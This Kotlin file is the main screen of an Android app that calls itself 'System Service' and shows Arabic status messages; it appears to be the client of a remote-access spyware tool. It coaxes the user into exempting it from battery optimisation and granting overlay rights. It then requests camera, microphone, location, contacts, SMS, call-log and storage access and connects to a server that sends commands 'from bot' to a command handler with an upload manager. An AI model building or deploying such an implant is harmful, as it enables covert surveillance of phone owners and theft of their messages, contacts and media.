package com.mdm.agent

import android.content.Intent
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.mdm.agent.data.remote.ApiClient
import com.mdm.agent.data.remote.CommandHandler
import com.mdm.agent.data.remote.CryptoManager
import com.mdm.agent.data.remote.SocketManager
import com.mdm.agent.data.remote.UploadManager
import com.mdm.agent.util.DeviceUtils

class MainActivity : AppCompatActivity() {

    companion object {
        @Volatile private var instanceSocketManager: SocketManager? = null
        @Volatile private var instance: MainActivity? = null

        fun getSocketManager(): SocketManager? = instanceSocketManager

        fun setSocketManager(sm: SocketManager?) {
            instanceSocketManager = sm
        }
    }

    private val TAG = "MainActivity"
    private var statusText: TextView? = null
    private var socketManager: SocketManager? = null
    private var btnAction: Button? = null
    private var mainLayout: LinearLayout? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        instance = this
        Log.i(TAG, "🚀 MainActivity started")

        setContentView(buildUI())
        checkAndProceed()
    }

    private fun buildUI(): View {
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(40, 120, 40, 40)
            setBackgroundColor(Color.parseColor("#FF075E54"))
        }
        mainLayout = layout

        val title = TextView(this).apply {
            text = "System Service"
            setTextColor(Color.WHITE)
            textSize = 24f
            setTypeface(typeface, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 16)
        }
        layout.addView(title)

        statusText = TextView(this).apply {
            text = "جاري التحقق..."
            setTextColor(Color.parseColor("#FFDCF8C6"))
            textSize = 16f
            gravity = Gravity.CENTER
            setPadding(0, 16, 0, 32)
        }
        layout.addView(statusText)

        btnAction = Button(this).apply {
            text = "متابعة"
            setTextColor(Color.WHITE)
            textSize = 16f
            setTypeface(typeface, Typeface.BOLD)
            background = GradientDrawable().apply {
                setColor(Color.parseColor("#FF25D366"))
                cornerRadius = 24f
            }
            setPadding(0, 32, 0, 32)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            visibility = View.GONE
        }
        layout.addView(btnAction)

        return layout
    }

    private fun checkAndProceed() {
        // Step 1: Battery Optimization
        val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            statusText?.text = "⚠️ مطلوب تعطيل تحسين البطارية\nليعمل التطبيق في الخلفية"
            btnAction?.text = "🔋 تعطيل تحسين البطارية"
            btnAction?.visibility = View.VISIBLE
            btnAction?.setOnClickListener { requestBatteryOptimization() }
            return
        }

        // Step 2: Overlay Permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            statusText?.text = "تم تعطيل البطارية ✅\n⚠️ فعّل العرض فوق التطبيقات"
            btnAction?.text = "🪟 تفعيل العرض فوق التطبيقات"
            btnAction?.visibility = View.VISIBLE
            btnAction?.setOnClickListener {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
                    startActivity(intent)
                } catch (e: Exception) {
                    Toast.makeText(this, "تعذّر فتح الإعدادات", Toast.LENGTH_LONG).show()
                }
            }
            return
        }

        // Step 3: Request all dangerous permissions + connect
        statusText?.text = "تم الإعداد ✅\nجاري طلب الأذونات والاتصال..."
        btnAction?.visibility = View.GONE

        requestAllPermissions()
        connectToServer()
    }

    @android.annotation.SuppressLint("BatteryLife")
    private fun requestBatteryOptimization() {
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
        } catch (e: Exception) {
            try {
                val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                startActivity(intent)
            } catch (e2: Exception) {
                Toast.makeText(this, "تعذّر فتح الإعدادات", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun requestAllPermissions() {
        val perms = arrayOf(
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(perms, 999)
            Log.i(TAG, "Requested all dangerous permissions")
        }
    }

    private fun connectToServer() {
        Thread {
            try {
                Log.i(TAG, "📡 Starting connection...")
                val deviceId = DeviceUtils.getDeviceId(this)
                val serverUrl = DeviceUtils.getServerUrl(this)
                Log.i(TAG, "  Server: $serverUrl")
                Log.i(TAG, "  Device: $deviceId")

                val apiClient = ApiClient(this)
                val cryptoManager = CryptoManager()
                val uploadManager = UploadManager(this)

                updateStatus("طلب مفاتيح التشفير...")
                val cryptoResult = apiClient.initCrypto(deviceId)
                if (cryptoResult != null) {
                    cryptoManager.initFromServer(cryptoResult)
                    Log.i(TAG, "✅ Crypto initialized")
                }

                updateStatus("إنشاء اتصال Socket.IO...")
                socketManager = SocketManager(this)
                setSocketManager(socketManager)

                val commandHandler = CommandHandler(this, apiClient, cryptoManager, socketManager!!, uploadManager)
                socketManager?.setCommandHandler(commandHandler)
                socketManager?.setCryptoManager(cryptoManager)

                // CRITICAL: Set onCommandReceived callback!
                socketManager?.onCommandReceived = { data ->
                    Log.i(TAG, "⚡ Command received from bot: ${data.optString("command")}")
                    commandHandler.handleCommand(data)
                }

                updateStatus("الاتصال بالخادم...")
                socketManager?.connect()

                Log.i(TAG, "🎉 Socket.IO connect called!")
                updateStatus("تم الاتصال ✅\nالتطبيق جاهز للعمل")

            } catch (e: Exception) {
                Log.e(TAG, "❌ Connection failed: ${e.message}", e)
                updateStatus("فشل الاتصال: ${e.message}")
            }
        }.start()
    }

    private fun updateStatus(text: String) {
        Handler(Looper.getMainLooper()).post {
            statusText?.text = text
            Log.i(TAG, "Status: $text")
        }
    }

    override fun onResume() {
        super.onResume()
        if (socketManager?.isConnected != true) {
            checkAndProceed()
        }
    }
}
